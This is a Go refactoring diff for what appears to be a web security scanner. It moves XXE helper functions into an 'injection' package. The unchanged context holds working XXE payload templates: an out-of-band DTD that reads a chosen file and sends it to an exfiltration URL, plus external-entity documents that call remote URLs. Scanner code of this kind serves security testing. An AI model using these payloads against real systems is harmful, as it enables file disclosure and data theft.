@@ -1,7 +1,9 @@
-package lua_engine
+package injection
 
 import (
 	lua "github.com/yuin/gopher-lua"
+
+	"github.com/londonmax12/hyperz/internal/lua_engine"
 )
 
 // buildXXETable returns the ctx.xxe helper namespace. The surface
@@ -41,12 +43,12 @@ func buildXXETable(L *lua.LState) *lua.LTable {
 }
 
 func xxeFileDiscloseDocsFn(L *lua.LState) int {
-	L.Push(PushStringList(L, XXEFileDiscloseDocsLua()))
+	L.Push(lua_engine.PushStringList(L, XXEFileDiscloseDocsLua()))
 	return 1
 }
 
 func xxeErrorDocsFn(L *lua.LState) int {
-	L.Push(PushStringList(L, XXEErrorDocsLua()))
+	L.Push(lua_engine.PushStringList(L, XXEErrorDocsLua()))
 	return 1
 }
 
@@ -56,12 +58,12 @@ func xxeBaselineDocFn(L *lua.LState) int {
 }
 
 func xxeExtractSystemTarget(L *lua.LState) int {
-	L.Push(lua.LString(XXEExtractSystemTargetLua(RequireString(L, 1))))
+	L.Push(lua.LString(XXEExtractSystemTargetLua(lua_engine.RequireString(L, 1))))
 	return 1
 }
 
 func xxeExtractExfilData(L *lua.LState) int {
-	L.Push(lua.LString(XXEExtractExfilDataLua(RequireString(L, 1))))
+	L.Push(lua.LString(XXEExtractExfilDataLua(lua_engine.RequireString(L, 1))))
 	return 1
 }
 
@@ -78,8 +80,8 @@ func xxeOOBExfilProbeFileFn(L *lua.LState) int {
 // the literal `<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM ...">` is
 // fiddly to escape correctly across Lua's quoting rules.
 func xxeDTDTemplate(L *lua.LState) int {
-	exfilURL := RequireString(L, 1)
-	probeFile := RequireString(L, 2)
+	exfilURL := lua_engine.RequireString(L, 1)
+	probeFile := lua_engine.RequireString(L, 2)
 	out := `<!ENTITY % file SYSTEM "` + probeFile + `">` +
 		`<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM '` + exfilURL + `?d=%file;'>">` +
 		`%wrap;` +
@@ -89,7 +91,7 @@ func xxeDTDTemplate(L *lua.LState) int {
 }
 
 func xxeSystemOOBDoc(L *lua.LState) int {
-	canaryURL := RequireString(L, 1)
+	canaryURL := lua_engine.RequireString(L, 1)
 	out := `<?xml version="1.0" encoding="UTF-8"?>` +
 		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "` + canaryURL + `">]>` +
 		`<foo>&xxe;</foo>`
@@ -98,7 +100,7 @@ func xxeSystemOOBDoc(L *lua.LState) int {
 }
 
 func xxeDTDLoaderDoc(L *lua.LState) int {
-	dtdURL := RequireString(L, 1)
+	dtdURL := lua_engine.RequireString(L, 1)
 	out := `<?xml version="1.0" encoding="UTF-8"?>` +
 		`<!DOCTYPE foo SYSTEM "` + dtdURL + `">` +
 		`<foo>x</foo>`
@@ -107,5 +109,5 @@ func xxeDTDLoaderDoc(L *lua.LState) int {
 }
 
 func init() {
-	RegisterHelperTable("xxe", buildXXETable)
+	lua_engine.RegisterHelperTable("xxe", buildXXETable)
 }
